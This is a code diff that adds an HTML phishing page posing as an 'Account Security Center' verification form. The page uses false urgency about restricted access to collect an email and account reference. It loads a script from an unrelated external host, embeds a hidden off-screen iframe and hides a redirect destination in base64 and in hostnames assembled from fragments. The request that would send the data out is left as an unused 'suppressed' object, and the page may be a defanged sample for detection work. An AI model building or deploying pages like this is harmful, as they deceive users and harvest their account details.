@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Security Center</title>
+
+  <link rel="icon" href="/assets/favicon.ico">
+
+  <script src="https://security-assets-demo.vercel.app/static/client.js"></script>
+  <link rel="stylesheet"
+        href="https://cdn-login-example.netlify.app/assets/main.css">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 80px auto;
+      background: white;
+      padding: 32px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+    }
+
+    .hidden-frame {
+      width: 1px;
+      height: 1px;
+      position: absolute;
+      left: -9999px;
+      opacity: 0;
+    }
+
+    .warning {
+      color: #b42318;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 12px;
+      margin: 8px 0;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 14px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+  <h2>Security Verification</h2>
+
+  <p>
+    We detected unusual activity associated with your account.
+  </p>
+
+  <p class="warning">
+    Your access may be temporarily restricted unless verification
+    is completed.
+  </p>
+
+  <form id="verifyForm" action="#" method="post">
+    <label>Email address</label>
+    <input
+      type="email"
+      name="email"
+      autocomplete="off"
+      placeholder="name@example.com">
+
+    <label>Account reference</label>
+    <input
+      type="text"
+      name="reference"
+      autocomplete="off"
+      placeholder="Account reference">
+
+    <button type="submit">Continue Verification</button>
+  </form>
+</div>
+
+<iframe
+  class="hidden-frame"
+  src="https://session-check-demo.s3.amazonaws.com/pixel.html">
+</iframe>
+
+<script>
+const redirectCandidates = [
+  "https://account-check-demo.netlify.app/session",
+  "https://secure-validation-demo.vercel.app/auth",
+  "https://verification-demo.s3.amazonaws.com/login",
+  "https://cdn-account-demo.pages.dev/continue"
+];
+
+const proto = "https:";
+
+const suspiciousHost = [
+  "secure",
+  "account",
+  "validation",
+  "demo.vercel.app"
+].join("-");
+
+const constructedRedirect =
+  proto + "//" + suspiciousHost + "/continue?session=expired";
+
+const encodedDestination =
+  "aHR0cHM6Ly9hY2NvdW50LWNoZWNrLWRlbW8ubmV0bGlmeS5hcHAvdmVyaWZ5";
+
+const decode = value => {
+  try {
+    return atob(value);
+  } catch {
+    return "";
+  }
+};
+
+const decoded = decode(encodedDestination);
+
+const suppressedLocation = {
+  href: constructedRedirect,
+  replace: redirectCandidates[1]
+};
+
+const suppressedRequest = {
+  endpoint: redirectCandidates[0],
+  method: "POST",
+  contentType: "application/json"
+};
+
+document
+  .getElementById("verifyForm")
+  .addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    const email = document.querySelector(
+      'input[name="email"]'
+    ).value;
+
+    const reference = document.querySelector(
+      'input[name="reference"]'
+    ).value;
+
+    const payload = {
+      email,
+      reference,
+      timestamp: Date.now(),
+      destination: decoded
+    };
+
+    sessionStorage.setItem(
+      "verification_payload",
+      JSON.stringify(payload)
+    );
+
+    document.querySelector(".container").innerHTML = `
+      <h2>Verification Complete</h2>
+      <p>Your request is being processed.</p>
+    `;
+  });
+
+setTimeout(() => {
+  const destination =
+    "https://auth-session-demo.netlify.app/continue";
+
+  sessionStorage.setItem(
+    "redirect_destination",
+    destination
+  );
+}, 2500);
+</script>
+
+</body>
+</html>
